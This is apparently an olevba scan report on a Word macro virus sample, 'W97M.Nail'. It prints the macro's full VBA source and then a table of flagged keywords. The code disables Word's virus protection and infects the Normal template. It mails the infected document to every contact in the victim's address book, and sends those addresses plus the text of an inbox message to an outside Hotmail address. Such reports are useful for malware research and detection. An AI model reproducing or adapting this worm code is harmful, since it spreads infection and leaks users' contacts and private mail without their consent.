olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nail.b-e4892a26605962ab19f2fa8c4e5cc949a7d70683
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nail.b-e4892a26605962ab19f2fa8c4e5cc949a7d70683 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'W97M.Nail/ACM (20/03/99) Variant v0.2
Private Sub Document_Open()
    On Error Resume Next
    Randomize
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office", "Melissa?") <> "" Then
            MsgBox ("W97M.Nail variant detected...")
            GInfo = "ES: "
        End If
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        Set MAPISess = CreateObject("MAPI.Session")
        MAPISess.Logon
            SubjectLines = Array("", MAPISess.CurrentUser, "Who's your Daddy?", "I've finished it!")
            ContentLines = Array("", "I thought you should know about this recent development...", "The media distort everything...", "You would probably find this interesting...")
            MesNum = Int(Rnd * 4)
            CRLF = Chr(13) + Chr(10)
            MesContent = CRLF + ContentLines(MesNum) + CRLF + CRLF + MAPISess.CurrentUser
            Set ChainMes = MAPISess.Outbox.Messages.Add(SubjectLines(MesNum), MesContent)
            Set objRecipients = ChainMes.Recipients
            For Each AdrEntry In MAPISess.AddressLists(1).AddressEntries
                Set Recp = objRecipients.Add(Name:=AdrEntry.Address, Type:=3)
                GInfo = GInfo + AdrEntry.Address + ";"
            Next
            Set objAttach = ChainMes.Attachments.Add
            objAttach.Type = 1
            objAttach.Source = ActiveDocument.FullName
            objAttach.Position = 0
            objAttach.Name = MAPISess.CurrentUser
            GInfo = GInfo + CRLF + CRLF + MAPISess.Inbox.Messages(Int(Rnd * MAPISess.Inbox.Messages.Count) + 1).Text + CRLF
            GInfo = GInfo + "W97M.Nail II"
            Set Retr = MAPISess.Outbox.Messages.Add(MAPISess.CurrentUser, GInfo)
            Set Recp = Retr.Recipients.Add(Name:="chainnail@hotmail.com")
            Retr.Send
            ChainMes.Send
        MAPISess.Logoff
    End If
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Private Sub Document_New()
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|CurrentUser         |May detect Norman Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

